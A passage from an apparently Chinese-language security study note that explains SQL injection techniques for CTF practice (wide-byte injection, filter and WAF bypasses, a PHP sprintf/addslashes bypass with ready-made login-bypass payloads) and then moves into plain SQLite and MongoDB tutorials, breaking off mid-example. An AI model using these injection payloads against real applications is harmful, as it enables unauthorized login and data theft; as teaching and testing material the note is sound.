password='$curr_pass'\n```\n\n由于这里不会被转义，故可以直接利用，这个时候就变成了修改了admin的密码了\n\n之后利用修改的密码搭配admin用户名登录\n\n![image-20250604164803664](../image/achieve/202411/sql深入浅出/image-20250604164803664.png)\n\n## 13.宽字节注入\n\n### 什么是宽字节\n\n宽字节其实就是相对于ASCII那种单字节来说的，通常占两个字节的字符，类似GBK，GB2312编码这种就是常说的宽字节\n\n### 注入原理\n\n其实这个就是利用mysql的一个特性，mysql开启GBK编码处理的时候，默认会把两个字符认成是一个汉字（前提是第一个ASCII值要大于128才能到汉字的范围）比如利用%df，当我们输入单引号时，mysql会调用转义函数，将单引号变为`\\'`，其中\\的十六进制是%5c,mysql的GBK编码，会认为%df%5c是一个宽字节，也就是`’運’`，从而使单引号闭合（逃逸），进行注入攻击。\n\n## 转义单引号的绕过plus\n\n在Post请求中，此处介绍一个新方法：将utf-8转换为 utf-16 或 utf-32，例如将 ' 转为utf-16的 �' 。这里的�是有由类似%%%的东西组成的，然后再加上 ' (即%27)，然后相当于urlencode后类似 %EF%BF%%BD%27 的东西，然后是宽字符漏铜，%EF%BF会组成一个中文字符，而%BD%27也会被当成中文字符，然后php不会进行转义。然后语句流到mysql的时候，Mysql会将三个%转为一个中文字符，然后剩下%27作为引号，以此进行注入。\n\n```\nuname=�' or 1#&passwd=\n```\n\n## bypass技巧\n\n### 关键字过滤\n\n第一个就是返回内容的过滤\n\n1.可以用编码函数去绕过（使用hex或者使用reverse、to_base64等函数加密）\n\n例如题目过滤了flag关键字\n\n```\n-1' union select 1,hex(username),password from ctfshow_user3 where username = 'flag'--+\n```\n\n2.可以用like模糊匹配去绕过\n\n例如题目过滤了flag关键字\n\n```\n-1'||(username)like'fla_或者是-1'||(username)like'fla%\n```\n\n第二个就是查询语句的过滤\n\n- 大小写绕过\n\n在mysql中测试一下发现mysql对查询语句的大小写不敏感\n\n![image-20250502133652917](../image/achieve/202411/sql注入--ctfshow/image-20250502133652917.png)\n\n所以如果waf中不对大小写进行过滤的话，我们可以用大小写去绕过select等字词的关键字过滤\n\n- 双写绕过\n\n如果waf只是对关键字进行替换为空的话，可以使用双写去绕过\n\n### 绕过空格过滤\n\n空格可以用编码或者联合注释符(/**/)去绕过\n\n在本地测试一下\n\n- 联合注释符\n\n![image-20250502134808478](../image/achieve/202411/sql深入浅出/image-20250502134808478.png)\n\n- 编码绕过：`%09`,`%0a`,`%0b`,`%0c`,`%0d`都可以\n\n因为在url编码中这些都可以代替空格，但是在mysql语句中这些则不是\n\n![image-20250502135045046](../image/achieve/202411/sql深入浅出/image-20250502135045046.png)\n\n- 括号绕过：即添加括号代替空格\n\n### 绕过逗号过滤\n\nfrom to\n\n例如我们在盲注的时候往往都会截取字符，就会用到切片函数，这些函数都会用到逗号，所以我们可以\n\n```\nselect substr(database() from 1 for 1);\nselect mid(database() from 1 for 1);\n```\n\n其实翻译过来也很简单，就是从1到1\n\n### 绕过and和or过滤\n\nor的话可以用`||`绕过，and的话可以用`&&`绕过\n\n### 绕过注释符过滤\n\n- 用`#`号的urlencode编码%23\n- 用`--+`绕过\n- 手动闭合单引号，例如`?id=1' or '1'='1`或者`?id=1' or '1'='1' or '`\n\n## mysql奇怪的姿势\n\n#### 1.利用重音字符绕过过滤\n\nMySQL默认情况不区分重音符号的特性(ctfshow-web-渔人杯-Ez_Mysqli)\n\n- MySQL 的默认字符集通常是 `latin1`，而默认排序规则是 `latin1_swedish_ci`。\n\n- `latin1_swedish_ci`是一种不区分大小写、不区分重音符号的排序规则。\n\n  例如，`a`、`á`、`à`、`â` 被视为相同的字符。\n\n  在默认排序规则下，MySQL 会将带有重音符号的字符视为其基本字符。\n\n例如我们传入?username=ā，那么在解码的时候mysql会把ā当成是a去进行查询的\n\n![image-20250328233832896](../image/achieve/202411/极客大挑战2024/image-20250328233832896.png)\n\n#### 2.sprintf()函数绕过sql\n\n例子\n\n```php\n<?php\n$pass=sprintf(\"and pass='%s'\",addslashes($_GET['pass']));\n$sql=sprintf(\"select * from user where name='%s' $pass\",addslashes($_GET['name']));\n?>\n```\n\n这里的话用addslashes函数对传入的参数进行了一定的字符转义，但是问题是这里对name和pass都使用了这个函数，我们应该怎么去绕过这个反斜杠转义呢？\n\n- sprintf()函数\n\n`sprintf()` 函数是 PHP 中用于格式化字符串的一个功能强大的工具。\n\n基础语法\n\n```\nsprintf(format, arg1, arg2, arg++)\n```\n\nformat参数的格式值：\n\n%% - 返回一个百分号 %\n%b - 二进制数\n%c - ASCII 值对应的字符\n%d - 包含正负号的十进制数（负数、0、正数）\n%e - 使用小写的科学计数法（例如 1.2e+2）\n%E - 使用大写的科学计数法（例如 1.2E+2）\n%u - 不包含正负号的十进制数（大于等于 0）\n%f - 浮点数（本地设置）\n%F - 浮点数（非本地设置）\n%g - 较短的 %e 和 %f\n%G - 较短的 %E 和 %f\n%o - 八进制数\n%s - 字符串\n%x - 十六进制数（小写字母）\n%X - 十六进制数（大写字母）\n\n这里的话就是我们C语言中常规的输出函数printf，第一个参数format就是占位符格式化字符，后面的就是参数列表\n\n为什么这里有漏洞呢\n\n![image-20250318145612654](../image/achieve/202411/极客大挑战2024/image-20250318145612654.png)\n\n在官方文档中可以关注到`An integer followed by a dollar sign `$`, to specify which number argument to treat in the conversion.`这句话，意思就是一个数字后面跟着一个dollar美元符号`$`可以用来表示此处的占位符负责处理第几个参数，例如`%1$s`表示的就是该占位符处理第一个参数arg1\n\n但是如果format的类型不是规定的格式值，那么就会变为空\n\n所以总结以下两个点:\n\n- **如果 % 符号多于 arg 参数，则我们必须使用占位符。占位符位于 % 符号之后，由数字和 “$” 组成**\n- **如果%1$ + 非arg格式类型，程序会无法识别占位符类型，变为空**\n\n所以我们用这个sprintf函数注入的原理就是通过对format的错误类型让函数替换为空，从而让addslashes函数作用失效\n\n如果我们输入”%\\“或者”%1$\\“,他会把反斜杠当做格式化字符的类型，然而找不到匹配的项那么”%\\“,”%1$\\“就因为没有经过任何处理而被替换为空。\n\n那我们来看一下怎么实现这一操作\n\n- 无占位符的情况(`$\\`)\n\n```php\n<?php\n$sql=\"select * from user where username='%\\' and 1=1 #';\";\n$user='user';\necho sprintf($sql,$user);\n?>\n//运行结果\nselect * from user where username='' and 1=1 #';\n```\n\n因为这里有百分号所以在sprintf中会被当成是format类型去处理，但是因为`$\\`并不是规定的格式类型，所以这里会被替换成空\n\n- 有占位符的情况(`%1$\\`)\n\n```php\n<?php\n$input = addslashes (\"%1$' and 1=1#\" );\n//用addslashes函数进行了处理\n$b = sprintf (\"AND password='%s'\", $input );\n//对$input与$b进行了拼接\n$sql = sprintf (\"SELECT * FROM user WHERE username='%s' $b \", 'admin' );\n//$sql = sprintf (\"SELECT * FROM user WHERE username='%s' AND password='%1$\\' and 1=1#' \", 'admin' );\n//这个句子里面的\\是由addsashes为了转义单引号而加上的，使用%s与%1$\\类匹配admin，由于%\\是错误的格式类型，那么admin只会出现在%s里，%1$\\则为空\necho  $sql ;\n?>\n//运行结果\n//    SELECT * FROM user WHERE username='admin' AND password='' and 1=1#' \n```\n\n回到题目中，那我们的payload就是\n\n```\n?name=admin&pass=1%1$' or 1=1--+\n```\n\n#### 3.sql查询加空格以假乱真\n\n在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。导致我们有时候为了绕过admin的限制传入admin%20可以查询到admin的结果\n\n# sqlite注入\n\n基础知识参考:[菜鸟教程](https://www.runoob.com/sqlite/sqlite-tutorial.html)\n\n什么是sqlite?\n\nSQLite 是一个轻量级的关系型数据库管理系统（RDBMS），它以 C 语言编写，SQLite是一个进程内的库，实现了自给自足的、无服务器的、零配置的、事务性的 SQL 数据库引擎。\n\n关于sqlite的命令，还是跟其他数据库一样，有DDL，DML，DQL三种命令\n\n![image-20250210093129451](../image/achieve/202411/sql深入浅出/image-20250210093129451.png)\n\n和mysql一样，我们先试着在Ubuntu内安装一个sqlite\n\n### Ubuntu中搭建sqlite服务\n\nSQLite有一个重要的特性是零配置的，这意味着不需要复杂的安装或管理\n\nwget把压缩包下载下来\n\n```\nwget https://www.sqlite.org/2025/sqlite-autoconf-3490000.tar.gz\n```\n\n![image-20250209210105699](../image/achieve/202411/sql深入浅出/image-20250209210105699.png)\n\n```\n$ tar xvzf sqlite-autoconf-3071502.tar.gz\n$ cd sqlite-autoconf-3071502\n$ ./configure --prefix=/usr/local\n$ make\n$ make install\n```\n\n中间make比较久，耐心等待就可以了\n\n结束后我们输入`sqlite3`查看一下安装是否完成\n\n![image-20250209210730686](../image/achieve/202411/sql深入浅出/image-20250209210730686.png)\n\n安装好sqlite后我们就开始学习使用这个数据库\n\n```\nsqlite>.help\n#查看sqlite命令\nsqlite>.show\n#查看 SQLite 命令提示符的默认设置。\n```\n\nSQLite 是**不区分大小写**的，但也有一些命令是大小写敏感的\n\n#### 1.sqlite注释\n\nSQL 注释以两个连续的 \"-\" 字符（ASCII 0x2d）开始，并扩展至下一个换行符（ASCII 0x0a）或直到输入结束，以先到者为准。\n\n```sqlite\nsqlite>.help -- 这是一个简单的注释\n```\n\n所有的 SQLite 语句可以以任何关键字开始，如 SELECT、INSERT、UPDATE、DELETE、ALTER、DROP 等，所有的语句以分号 **;** 结束。\n\n#### 2.创建数据库\n\nSqlite数据库的特点是它每一个数据库都是一个文件\n\n首先我们先用ls命令查看一下当前目录下的内容\n\n![image-20250209212553154](../image/achieve/202411/sql深入浅出/image-20250209212553154.png)\n\n可以看到是没有test.db数据库文件的，接下来我们试着创建一下\n\n```sqlite\nsqlite3 test.db\n```\n\n因为sqlite的每个数据库都可以看成是一个文件，所以我们不能直接在sqlite命令行中输入创建数据库的命令，而是需要在终端输入，输入后会创建数据库文件并进入该数据库文件的命令行窗口\n\n![image-20250209212759310](../image/achieve/202411/sql深入浅出/image-20250209212759310.png)\n\n##### .databases命令\n\n`.databases` 是一个命令，用于显示当前已连接数据库的列表及其相关信息。\n\n```sqlite\nsqlite>.databases --使用.databases命令来检查它是否在数据库列表中\n```\n\n我们退出来看一下是否有这个数据库文件\n\n##### .quit命令\n\n**.quit** 命令退出 sqlite 提示符\n\n![image-20250209213426232](../image/achieve/202411/sql深入浅出/image-20250209213426232.png)\n\n##### .open命令\n\n另外我们也可以使用 **.open** 来建立新的数据库文件：\n\n```sqlite\nsqlite>.open test1.db\n```\n\n如果 **test1.db** 存在则直接会打开，不存在就创建它。\n\n![image-20250209213605965](../image/achieve/202411/sql深入浅出/image-20250209213605965.png)\n\n可以看到成功创建了两个数据库\n\n##### .dump命令\n\n`.dump` 命令用于导出数据库或特定表的内容\n\n![image-20250209214019493](../image/achieve/202411/sql深入浅出/image-20250209214019493.png)\n\n上面结果说明当前数据库没有表或数据\n\n当然我们也可以用.dump命令去导出特定的表，但是我们还没有创建表和数据，所以这里暂时不讲\n\n我们还可以用.dump将导出的内容保存到文件中，可以通过重定向输出实现。\n\n```\n$sqlite3 test1.db .dump > test1.sql\n```\n\n上面的命令将转换整个 **test1.db** 数据库的内容到 SQLite 的语句中，并将其转储到 ASCII 文本文件 **test1.sql** 中\n\n如果我们想要从生成的 testDB.sql 恢复，利用重定向符号即可\n\n```\n$sqlite3 test1.db < test1.sql\n```\n\n此时的数据库是空的，一旦数据库中有表和数据，我们则可以尝试上述两个程序\n\n#### 3.附加(选择)数据库\n\n如果我们有多个数据库文件可以操作使用，而我们想要使用其中一个的时候，我们就可以用SQLite 的 **ATTACH DATABASE** 语句来选择一个特定的数据库，使用该命令后，所有的 SQLite 语句将在附加的数据库下执行。\n\n语法\n\n```sqlite\nATTACH DATABASE file_name AS database_name;\n```\n\n![image-20250209214739375](../image/achieve/202411/sql深入浅出/image-20250209214739375.png)\n\n##### .database命令\n\n和前面的.databases命令差不多，但是这个通常会显示更为详细的信息，包括数据库的状态\n\n使用.database命令来显示附加的数据库\n\n数据库名称 **main** 和 **temp** 被保留用于主数据库和存储临时表及其他临时数据对象的数据库。这两个数据库名称可用于每个数据库连接，且不应该被用于附加，否则将得到一个警告消息\n\n![image-20250210001031950](../image/achieve/202411/sql深入浅出/image-20250210001031950.png)\n\n#### 4.分离数据库\n\n*SQLite 的* **DETACH DATABASE** *语句是用来把命名数据库从一个数据库连接分离和游离出来，连接是之前使用 ATTACH 语句附加的。如果同一个数据库文件已经被附加上多个别名，DETACH 命令将只断开给定名称的连接，而其余的仍然有效。您无法分离* **main** *或* **TEST** *数据库。*\n\n我们要注意，如果数据库是在内存中或者是临时数据库，则该数据库将被摧毁，且内容将会丢失。\n\n语法:\n\n```\nDETACH DATABASE 'Alias-Name';\n```\n\n我们实操一下\n\n前面创建了一个数据库test1.db，并给它附加了 'test' 和 'currentDB'，使用 .database 命令\n\n![image-20250210001248474](../image/achieve/202411/sql深入浅出/image-20250210001248474.png)\n\n这里我们可以看到这三个数据库是连接在一起的，接下来我们分离出currentDB附加数据库，使用.database命令\n\n```sqlite\nsqlite> DETACH DATABASE 'currentDB';\n```\n\n![image-20250210001428315](../image/achieve/202411/sql深入浅出/image-20250210001428315.png)\n\n可以看到testDB.db 仍与 'test' 和 'main' 保持连接。但是'currentDB'已经被分离出去断开连接了\n\n#### 5.创建数据表\n\nSQLite 的 **CREATE TABLE** 语句用于在任何给定的数据库创建一个新表。创建基本表，涉及到命名表、定义列及每一列的数据类型。其实和mysql的创建表是一样的\n\n语法\n\n```sqlite\nCREATE TABLE database_name.table_name(\n   column1 datatype  PRIMARY KEY(one or more columns),\n   column2 datatype,\n   column3 datatype,\n   .....\n   columnN datatype,\n);\n```\n\n我们试一下\n\n```sqlite\nsqlite>create table helloworld(     \n(x1...> ID INT PRIMARY KEY NOT NULL,\n(x1...> NAME    TEXT       NOT NULL,\n(x1...> AGE    INT     NOT NULL);\n```\n\n然后我们使用.tables命令\n\n##### .tables命令\n\n`.tables` 命令用于列出当前数据库中的所有表\n\n![image-20250210002228282](../image/achieve/202411/sql深入浅出/image-20250210002228282.png)\n\n1. **主数据库表**：`helloworld` 是您在当前数据库中创建的表，属于主数据库（通常是 `main` 数据库）。\n2. **附加数据库表**：`test.helloworld` 表示在一个名为 `test` 的附加数据库中的 `helloworld` 表。\n\n或者我们可以使用.schema命令查看表的完整信息\n\n##### .schema命令\n\n`.schema` 命令用于显示当前数据库中所有表的结构，包括表的创建语句、列的定义、索引等。\n\n![image-20250210002711008](../image/achieve/202411/sql深入浅出/image-20250210002711008.png)\n\n#### 6.删除表\n\n*SQLite 的* **DROP TABLE** *语句用来删除表定义及其所有相关数据、索引、触发器、约束和该表的权限规范。*\n\n语法\n\n```sqlite\nDROP TABLE database_name.table_name;\n```\n\n我们对比一下删除前后的`.tables`的结果就可以看到了\n\n![image-20250210003044465](../image/achieve/202411/sql深入浅出/image-20250210003044465.png)\n\n可以看到我们的主数据库和附加数据库的表都被删除了\n\n#### 7.插入数据\n\nSQLite 的 **INSERT INTO** 语句用于向数据库的某个表中添加新的数据行。\n\n语法\n\n```sqlite\nINSERT INTO TABLE_NAME [(column1, column2, column3,...columnN)]  \nVALUES (value1, value2, value3,...valueN);\n```\n\n在这里，column1, column2,...columnN 是要插入数据的表中的列的名称。\n\n如果要为表中的所有列添加值，您也可以不需要在 SQLite 查询中指定列名称。但要确保值的顺序与列在表中的顺序一致。SQLite 的 INSERT INTO 语法如下：\n\n```sqlite\nINSERT INTO TABLE_NAME VALUES (value1,value2,value3,...valueN);\n```\n\n我们先用第一个方法试一下\n\n```sqlite\nsqlite> INSERT INTO helloworld\n   ...> (ID,NAME,AGE)\n   ...> VALUES(1,'wanth3f1ag',19);\n```\n\n注意这里的类型要对的上不然会报错\n\n然后我们用第二个语句写一个数据\n\n```sqlite\nsqlite> INSERT INTO helloworld VALUES(2,'wanth3flag',20);\n```\n\n没报错的话就是成功写入数据了，怎么验证我们接下来讲查询语句就知道了\n\n#### 8.查询语句\n\nSQLite 的 **SELECT** 语句用于从 SQLite 数据库表中获取数据，以结果表的形式返回数据。这些结果表也被称为结果集。\n\n语法\n\n```sqlite\n查询个别字段\nSELECT column1, column2, columnN FROM table_name;\n查询所有字段\nSELECT * FROM table_name;\n```\n\n其实和mysql的查询语句是差不多的\n\n![image-20250210095603518](../image/achieve/202411/sql深入浅出/image-20250210095603518.png)\n\n当然我们还可以设置我们的输出宽度，避免有时候因为数据过长而导致宽度不够被截断，从而数据无法完整展示\n\n#####  **.width num, num....** 命令 \n\n**.width num, num....** 命令设置显示列的宽度\n\n#### 9.WHERE子语句\n\nSQLite的 **WHERE** 子句用于指定从一个表或多个表中获取数据的条件。这一点和mysql是一样的\n\n如果满足给定的条件，即为真（true）时，则从表中返回特定的值。我们可以使用 WHERE 子句来过滤记录，只获取需要的记录。\n\nWHERE 子句不仅可用在 SELECT 语句中，它也可用在 UPDATE、DELETE 语句中\n\n语法\n\n```sqlite\nSELECT column1, column2, columnN \nFROM table_name\nWHERE [condition]\n```\n\ncodition就是我们的条件语句，因为之前mysql里面演示过这里就不赘述了\n\n不过在sqlite中，我们的where子语句可以搭配运算符去进行精确的查询\n\n##### 运算符\n\n运算符用于指定 SQLite 语句中的条件，并在语句中连接多个条件。\n\n- 算术运算符\n- 比较运算符\n- 逻辑运算符\n- 位运算符\n\n![image-20250210101043640](../image/achieve/202411/sql深入浅出/image-20250210101043640.png)\n\n这里摘录一些常见的逻辑运算符\n\n| 运算符  | 描述                                                         |\n| :------ | :----------------------------------------------------------- |\n| AND     | AND 运算符允许在一个 SQL 语句的 WHERE 子句中的多个条件的存在。 |\n| BETWEEN | BETWEEN 运算符用于在给定最小值和最大值范围内的一系列值中搜索值。 |\n| EXISTS  | EXISTS 运算符用于在满足一定条件的指定表中搜索行的存在。      |\n| IN      | IN 运算符用于把某个值与一系列指定列表的值进行比较。          |\n| NOT IN  | IN 运算符的对立面，用于把某个值与不在一系列指定列表的值进行比较。 |\n| LIKE    | LIKE 运算符用于把某个值与使用通配符运算符的相似值进行比较。  |\n| GLOB    | GLOB 运算符用于把某个值与使用通配符运算符的相似值进行比较。GLOB 与 LIKE 不同之处在于，它是大小写敏感的。 |\n| NOT     | NOT 运算符是所用的逻辑运算符的对立面。比如 NOT EXISTS、NOT BETWEEN、NOT IN，等等。**它是否定运算符。** |\n| OR      | OR 运算符用于结合一个 SQL 语句的 WHERE 子句中的多个条件。    |\n| IS NULL | NULL 运算符用于把某个值与 NULL 值进行比较。                  |\n| IS      | IS 运算符与 = 相似。                                         |\n| IS NOT  | IS NOT 运算符与 != 相似。                                    |\n| \\|\\|    | 连接两个不同的字符串，得到一个新的字符串。                   |\n| UNIQUE  | UNIQUE 运算符搜索指定表中的每一行，确保唯一性（无重复）。    |\n\n其实大部分和mysql中的是一样的\n\n位运算符，这里假设A=60，B=13\n\n| 运算符 | 描述                                                         | 实例                                                         |\n| :----- | :----------------------------------------------------------- | :----------------------------------------------------------- |\n| &      | 如果同时存在于两个操作数中，二进制 AND 运算符复制一位到结果中。 | (A & B) 将得到 12，即为 0000 1100                            |\n| \\|     | 如果存在于任一操作数中，二进制 OR 运算符复制一位到结果中。   | (A \\| B) 将得到 61，即为 0011 1101                           |\n| ~      | 二进制补码运算符是一元运算符，具有\"翻转\"位效应，即0变成1，1变成0。 | (~A ) 将得到 -61，即为 1100 0011，一个有符号二进制数的补码形式。 |\n| <<     | 二进制左移运算符。左操作数的值向左移动右操作数指定的位数。   | A << 2 将得到 240，即为 1111 0000                            |\n| >>     | 二进制右移运算符。左操作数的值向右移动右操作数指定的位数。   | A >> 2 将得到 15，即为 0000 1111                             |\n\n# nosql注入\n\n## 什么是nosql？\n\n参考文章：https://www.freebuf.com/articles/web/358650.html\n\nNoSQL 即 Not Only SQL，意即 “不仅仅是SQL”。他指的不是单单某一种数据库管理系统，而是用于描述一类数据库管理系统，包括键值数据库，列式数据库，文本数据库，图形数据库等。这些系统会使用不同于传统关系型数据库的数据存储模型。NoSQL数据库**提供比传统SQL数据库更宽松的一致性限制**。 通过减少关系约束和一致性检查，**NoSQL数据库提供了更好的性能和扩展性**。 然而，即使这些数据库没有使用传统的SQL语法，它们仍然可能很容易的受到注入攻击。 由于这些NoSQL注入攻击可以在程序语言中执行，而不是在声明式 SQL语言中执行，所以潜在影响要大于传统SQL注入。\n\n而MongoDB 是当前最流行的 NoSQL 数据库产品之一，由 C++ 语言编写，是一个基于分布式文件存储的数据库。旨在为 WEB 应用提供可扩展的高性能数据存储解决方案。\n\n### NSQL数据库类型\n\nNOSQL主要有四种数据类型，分别是文档数据库，键值数据库，宽列存储数据库和图形数据库。\n\n- **文档数据库**将数据存储在类似于 JSON（JavaScript 对象表示法）对象的文档中。每个文档包含成对的字段和值。这些值通常可以是各种类型，包括字符串、数字、布尔值、数组或对象等，并且它们的结构通常与开发者在代码中使用的对象保持一致。由于字段值类型和强大的查询语言的多样性，因此文档数据库非常适合各种各样的使用案例，并且可以用作通用数据库。它们可以横向扩展以适应大量数据。\n- **键值数据库**是一种较简单的数据库，其中每个项目都包含键和值。通常只能通过引用键来检索值，因此学习如何查询特定键值对通常很简单。键值数据库非常适合需要存储大量数据但无需执行复杂查询来检索数据的使用案例。常见的使用案例包括存储用户首选项或缓存。Redis 和 DynanoDB 是流行的键值数据库。\n- **宽列存储**将数据存储在表、行和动态列中。宽列存储提供了比关系型数据库更大的灵活性，因为不需要每一行都具有相同的列。许多人认为宽列存储是二维键值数据库。宽列存储非常适合需要存储大量数据并且可以预测查询模式的情况。宽列存储通常用于存储物联网数据和用户配置文件数据。Cassandra 和 HBase 是较受欢迎的两种宽列存储。\n- **图形数据库**将数据存储在节点和边中。节点通常存储有关人物、地点和事物的信息，而边缘则存储有关节点之间的关系的信息。在需要遍历关系以查找模式（例如社交网络，欺诈检测和推荐引擎）的使用案例中，图形数据库非常出色。Neo4j 和 JanusGraph 是图形数据库的示例。\n\n接下来我们就以MongDB为例，去讲解这个nosql注入\n\n## 什么是 MongoDB ?\n\nMongoDB 是一个文档型数据库，数据以类似 JSON 的文档形式存储。\n\nMongoDB 将数据存储为一个文档，数据结构由键值（key=>value）对组成。MongoDB 文档类似于 JSON 对象。字段值可以包含其他文档，数组及文档数组。\n\nMongoDB使用集合（Collections）来组织文档（Documents），每个文档都是由键值对组成的。\n\n- **数据库（Database）**：存储数据的容器，类似于关系型数据库中的数据库。\n- **集合（Collection）**：数据库中的一个集合，类似于关系型数据库中的表。\n- **文档（Document）**：集合中的一个数据记录，类似于关系型数据库中的行（row），以 BSON 格式存储。\n\n## 关于MongDB基础使用\n\n| RDBMS  | MongoDB                           |\n| ------ | --------------------------------- |\n| 数据库 | 数据库                            |\n| 表格   | 集合                              |\n| 行     | 文档                              |\n| 列     | 字段                              |\n| 表联合 | 嵌入文档                          |\n| 主键   | 主键（MongoDB 提供了 key 为 _id） |\n\n- 数据库(database)\n\n一个 MongoDB 中可以建立多个数据库。MongoDB 的单个实例可以容纳多个独立的数据库，每一个都有自己的集合和权限，不同的数据库也放置在不同的文件中。\n\n```\nshow dbs显示所有的数据库的列表\ndb 显示当前数据库对象或集合\nuse 数据库名\n```\n\n- 集合(collection)\n\n集合就是 MongoDB 文档组，类似于 RDBMS 关系数据库管理系统中的表格。集合存在于数据库中，集合没有固定的结构，这意味着你在对集合可以插入不同格式和类型的数据。\n\n`show collections` 或 `show tables` 命令可以查看已有集合\n\n- 文档（Document）\n\n文档是一组键值（key-value）对，类似于 RDBMS 关系型数据库中的一行。MongoDB 的文档不需要设置相同的字段，并且相同的字段不需要相同的数据类型，这与关系型数据库有很大的区别，也是 MongoDB 非常突出的特点。\n\n## 安装MongoDB\n\n```\n更新软件源\nsudo apt update\nsudo apt upgrade -y\n导入密钥\nwget -qO - https://www.mongodb.org/static/pgp/server-6.0.asc | sudo apt-key add -\n添加 MongoDB 的软件源\necho \"deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu $(lsb_release -cs)/mongodb-org/6.0 multiverse\" | sudo tee /etc/apt/sources.list.d/mongodb-org-6.0.list\nsudo apt update\n安装 MongoDB\nsudo apt install -y mongodb-org\n启动服务\nsudo systemctl start mongod\n设置开机自启动\nsudo systemctl enable mongod\n检测服务状态\nsudo systemctl status mongod\n```\n\n安装好后我们打开MongoDB\n\n```\nmongosh\n```\n\n![image-20250521165019521](../image/achieve/202411/sql深入浅出/image-20250521165019521.png)\n\n然后我们看看版本\n\n```\ntest> db.version()\n6.0.23\n```\n\n成功安装\n\n## MongoDB基础语法\n\n在MongoDB中，数据库的创建是一个简单的过程，当你首次向MongoDB中插入数据时，如果数据库不存在，MongoDB会自动创建它。\n\n## 1.操作数据库\n\n### 查看数据库列表\n\n```\nshow dbs\n```\n\n### 查看当前使用数据库\n\n```\ndb\n```\n\n### 创建数据库\n\n当你使用 **use** 命令来指定一个数据库时，如果该数据库不存在，MongoDB将自动创建它。\n\n```nosql\nuse DATABASE_NAME #如果数据库不存在，则创建数据库，否则切连接并换到指定数据库\n```\n\n举个例子\n\n```\ntest> use helloworld\nswitched to db helloworld\nhelloworld> db\nhelloworld\n```\n\n但是我们在show dbs的时候并不会看到现在创建的数据库\n\n```\nhelloworld> show dbs\nadmin   40.00 KiB\nconfig  60.00 KiB\nlocal   40.00 KiB\n```\n\n要显示它，我们需要向 runoob 数据库插入一些数据。\n\n### 删除数据库\n\n如果你需要删除数据库，可以使用 **db.dropDatabase()** 方法：\n\n```\nuse myDatabase\ndb.dropDatabase()\n```\n\n需要注意的是，当我们没有指定数据库的时候，系统默认是test数据库，所有的操作都是指向test数据库的\n\n## 2.操作集合\n\n### 创建集合\n\n使用 `createCollection()` 方法来创建集合\n\n基础语法\n\n```\ndb.createCollection(name, options)\n```\n\n- name：要创建的集合名称\n- options：可选参数，指定有关内存大小及索引的选项\n\n关于options的参数\n\n摘录自[菜鸟教程](https://www.runoob.com/mongodb/mongodb-create-collection.html)\n\n| 参数名             | 类型   | 描述                                                         | 示例值                          |\n| :----------------- | :----- | :----------------------------------------------------------- | :------------------------------ |\n| `capped`           | 布尔值 | 是否创建一个固定大小的集合。                                 | `true`                          |\n| `size`             | 数值   | 集合的最大大小（以字节为单位）。仅在 `capped` 为 true 时有效。 | `10485760` (10MB)               |\n| `max`              | 数值   | 集合中允许的最大文档数。仅在 `capped` 为 true 时有效。       | `5000`                          |\n| `validator`        | 对象   | 用于文档验证的表达式。                                       | `{ $jsonSchema: { ... }}`       |\n| `validationLevel`  | 字符串 | 指定文档验证的严格程度。 `\"off\"`：不进行验证。 `\"strict\"`：插入和更新操作都必须通过验证（默认）。 `\"moderate\"`：仅现有文档更新时必须通过验证，插入新文档时不需要。 | `\"strict\"`                      |\n| `validationAction` | 字符串 | 指定文档验证失败时的操作。 `\"error\"`：阻止插入或更新（默认）。 `\"warn\"`：允许插入或更新，但会发出警告。 | `\"error\"`                       |\n| `storageEngine`    | 对象   | 为集合指定存储引擎配置。                                     | `{ wiredTiger: { ... }}`        |\n| `collation`        | 对象   | 指定集合的默认排序规则。                                     | `{ locale: \"en\", strength: 2 }` |\n\n举个例子，我们在数据库中创建一个集合\n\n```\ntest> use helloworld\nswitched to db helloworld\nhelloworld> db.createCollection(\"users\")\n{ ok: 1 }\n```\n\n### 查看集合\n\n```\nshow collections\nshow tables\n```\n\n这两个命令都可以\n\n```\nhelloworld> show collections\nusers\nhelloworld> show tables\nusers\n```\n\n### 更新集合名\n\n在 MongoDB 中，不能直接通过命令来重命名集合。需要使用renameCollection 方法来重命名集合。\n\n#### renameCollection 方法\n\nrenameCollection 方法在 MongoDB 的 admin 数据库中运行，可以将一个集合重命名为另一个名称。\n\n语法\n\n```sql\ndb.adminCommand({\n  renameCollection: \"sourceDb.sourceCollection\",\n  to: \"targetDb.targetCollection\",\n  dropTarget: <boolean>\n})\n```\n\n**参数说明：**\n\n- **renameCollection**：要重命名的集合的完全限定名称（包括数据库名）。\n- **to**：目标集合的完全限定名称（包括数据库名）。\n- **dropTarget**（可选）：布尔值。如果目标集合已经存在，是否删除目标集合。默认值为 `false`。\n\n我们本地尝试一下\n\n```sql\nhelloworld> db.adminCommand({\n... renameCollection:\"helloworld.users\",\n... to:\"helloworld.users1\"\n... });\n{ ok: 1 }\nhelloworld> show tables\nusers1\n```\n\n我们也可以将集合重命名到另一个数据库\n\n```sql\nhelloworld> use helloworld1\nswitched to db helloworld1\nhelloworld1> db.createCollection(\"user\")\n{ ok: 1 }\nhelloworld1> db.adminCommand({\n... renameCollection:\"helloworld1.user\",\n... to:\"helloworld.user\"\n... });\n{ ok: 1 }\nhelloworld1> show tables;\n\nhelloworld1> use helloworld\nswitched to db helloworld\nhelloworld> show tables\nuser\nusers1\n```\n\n需要注意的是，使用renameCollection命令需要具有对两边数据库都有操作权限，例如dbadmin\n\n### 删除集合\n\n```\ndb.collection.drop()\n```\n\n无参数\n\n例如我们删除刚刚已存在的users1\n\n```sql\nhelloworld> db.users1.drop()\ntrue\nhelloworld> show tables;\nuser\n```\n\n## 3.操作文档\n\n### 插入文档\n\n其实插入文档的方法有两种，一种是插入单个文档insertOne()，一种是插入多个文档insertMany()\n\n#### 插入单个文档insertOne()\n\ninsertOne() 方法用于在集合中插入单个文档。\n\n基础语法\n\n```\ndb.collection.insertOne(document, options)\n```\n\n- document：要插入的单个文档。\n- options（可选）：一个可选参数对象，可以包含 writeConcern 和 bypassDocumentValidation 等。\n\n举个例子，我们在数据库的集合中插入一个文档\n\n```sql\nhelloworld> db.user.insertOne({\n... name:\"wanth3f1ag\",\n... age:20,\n... city:\"Cheng Du\"\n... });\n{\n  acknowledged: true,\n  insertedId: ObjectId('682d99b59f4df71519c59f35')\n}\n```\n\n然后我们find查询文档\n\n```sql\nhelloworld> db.user.find()\n[\n  {\n    _id: ObjectId('682d99b59f4df71519c59f35'),\n    name: 'wanth3f1ag',\n    age: 20,\n    city: 'Cheng 